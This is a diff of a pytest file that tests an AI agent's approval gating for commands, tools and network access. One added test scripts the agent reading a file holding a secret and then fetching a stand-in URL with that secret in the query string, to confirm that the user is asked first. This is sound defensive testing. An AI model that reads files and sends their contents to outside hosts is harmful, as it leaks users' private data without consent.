@@ -49,7 +49,7 @@ def test_timeout_declines(run_agent, tmp_path):
 
 def test_cancel_while_pending_declines(start_agent, tmp_path):
     script = [[call("run_command", {"command": f"touch {tmp_path}/flag"}), {"done": True}], answer()]
-    with start_agent(USER, script, CAPS) as (proc, _):
+    with start_agent({"messages": [{"role": "user", "content": "run it in the terminal"}]}, script, CAPS) as (proc, _):
         lines = []
         for line in proc.stdout:
             lines.append(line)
@@ -88,3 +88,31 @@ def test_launch_app_resolves_desktop_id(run_agent, tmp_path):
     opened = of_type(events, "request.opened")[0]
     assert opened["kind"] == "launch" and opened["summary"] == "Open Zebra Notes"
     assert (tmp_path / "launched").read_text().strip() == "gtk-launch org.example.ZebraNotes"
+
+
+def test_a_tool_not_offered_for_the_request_is_refused(start_agent, tmp_path):
+    script = [[call("run_command", {"command": f"touch {tmp_path}/flag"}), {"done": True}], answer()]
+    with start_agent(USER, script, CAPS) as (proc, _):
+        out, _ = proc.communicate(timeout=30)
+    events = parse_events(out)
+    assert not (tmp_path / "flag").exists()
+    assert of_type(events, "request.opened") == []
+    item = started(events, "command_execution")[0]
+    assert "wasn't offered" in completion(events, item["id"])["output"]
+
+
+def test_going_online_after_reading_your_files_asks_first(run_agent, tmp_path):
+    secret = tmp_path / "notes.txt"
+    secret.write_text("the launch code is 1234\n")
+    events, fake = run_agent(USER, [[call("read", {"path": str(secret)}), {"done": True}],
+                                    [call("web_fetch", {"url": "https://example.invalid/?d=1234"}), {"done": True}],
+                                    answer()], caps=CAPS, stdin_lines=[DECLINE])
+    opened = of_type(events, "request.opened")
+    assert len(opened) == 1 and opened[0]["kind"] == "network"
+    assert "example.invalid" in opened[0]["detail"]
+    assert of_type(events, "request.resolved")[0]["decision"] == "decline"
+
+
+def test_going_online_before_reading_anything_does_not_ask(run_agent):
+    events, _ = run_agent(USER, [[call("web_search", {"query": "weather"}), {"done": True}], answer()], caps=CAPS)
+    assert of_type(events, "request.opened") == []
